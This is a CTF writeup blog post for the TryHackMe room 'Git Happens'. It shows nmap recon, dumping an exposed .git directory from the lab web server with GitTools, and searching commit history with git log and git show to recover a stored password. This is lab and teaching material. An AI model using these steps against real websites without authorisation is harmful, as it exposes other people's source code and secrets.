---
layout: post
title: Git Happens Writeup
subtitle: Can you find the password to the application?
thumbnail-img: /assets/img/githappenslogo.png
# cover-img: 
# gh-badge: [star, fork, follow]
tags: [ctf,tryhackme, writeup, git]
# comments: true
---

Boss wanted me to create a prototype, so here it is! We even used something called ***version control*** that made deploying this really easy!


## Here is a machine information

| Title | Git Happens | 
| :------ |:--- | 
| Difficulty | Easy | 
| Point | 80 |
| Maker | Hydragyrum |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 


## NMAP
We have an IP as usual, and we can start with the basic nmap scan

```bash
nmap -sC -sV -A machine-ip 
```
<em>

-A : Os detection, version detection, traceroute

-sS : TCP syn scan ( for faster scan, needs root privilege )

-o : For storing output in file
</em>

After finishing scan with nmap, we got the result as tcp (80) is open and more interesting directory was found is *.git*

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 02:35 EDT
Nmap scan report for 10.10.242.228
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.242.228:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## What can we do with .git  directory?

i tryed to access the .git directory via *http://machine-ip/.git*

![.git directory](/leiz95/assets/img/git.png)

In order to get the contents of the directory, I used this.
My favorite search engine is [GitTool](https://github.com/internetwache/GitTools)
After clone this tool. 

firstly, we need to dump all the file by cmd 

```bash
./gitdumper.sh http://machine-ip/.git/ gitdump
```
Then  extract it.
```bash
./extractor.sh /gitdump /extractor
```
After finish all the dump and extract. i got this.

![extractor](/leiz95/assets/img/extract.png)

In order to get all the files in the previous commits, we run this command

```bash
git checkout .
```
we got all files: 

![extractor](/leiz95/assets/img/extractall.png)

## Getting the password 

Nomally, when we have the git file. we should run cmd 

```bash
git log
```
![gitlog](/leiz95/assets/img/gitlog.png)

We can go through all the modification file by run:

```bash
git show bc8054d9d95854d278359a432b6d97c27e24061d
```
We can see all the file change in this commit.
We go through all commit with this command. 
in the ***e56eaa8e29b589976f33d76bc58a0c4dfb9315b1*** object. 
 
![result](/leiz95/assets/img/result.png)

Yeah, we got the password now !!!!

Another way, it will not waste your time to  much by run:

 ```bash
 git log | grep commit | cut -d " " -f2 | xargs git show 
```

This will real all the changed files.